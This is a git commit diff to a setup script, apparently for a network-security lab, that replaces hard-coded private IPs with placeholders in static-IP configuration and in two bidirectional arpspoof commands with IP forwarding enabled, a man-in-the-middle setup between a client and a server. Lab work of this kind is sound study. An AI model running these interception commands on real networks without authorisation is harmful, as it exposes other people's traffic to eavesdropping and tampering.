b3a32c7dd45c13c82f423e9e775331fff3e4b373
Yashaswini Pinnaka <126356634+Pyashaswini@users.noreply.github.com>
2024-12-03 15:03:15 +0530

    Update prerequisites.sh

--- prerequisites.sh
+++ prerequisites.sh
@@ -7,18 +7,18 @@ iface lo inet loopback
 # Ethernet interface (change 'eth0' to your actual interface name)
 auto eth0    # or ens33, enp0s3, etc. based on your output
 iface eth0 inet static
-    address 192.168.165.136  # Your desired static IP
-    netmask 255.255.255.0     # Subnet mask
-    gateway 192.168.165.166      # Replace with your actual gateway (usually your router IP)
+    address xxx.xxx.xxx.xxx  # Your desired static IP
+    netmask xxx.xxx.xxx.xxx      # Subnet mask
+    gateway xxx.xxx.xxx.xxx       # Replace with your actual gateway (usually your router IP)
 
 2)network setup
 #run this in a terminal each time you restart
 sudo ip link set eth0 up
-sudo ip addr add 192.168.165.136/24 dev eth0
-sudo ip route add default via 192.168.165.166
+sudo ip addr add xxx.xxx.xxx.xxx/24 dev eth0 #the static ip you set 
+sudo ip route add default via xxx.xxx.xxx.xxx # Replace with your actual gateway (usually your router IP)
 sudo systemctl restart networking
 
 3)arpspoofing
 sudo sysctl -w net.ipv4.ip_forward=1
-sudo arpspoof -i eth0 -t 192.168.165.135 192.168.165.40
-sudo arpspoof -i eth0 -t 192.168.165.40 192.168.165.135
+sudo arpspoof -i eth0 -t client-ip server-ip
+sudo arpspoof -i eth0 -t server-ip client-ip
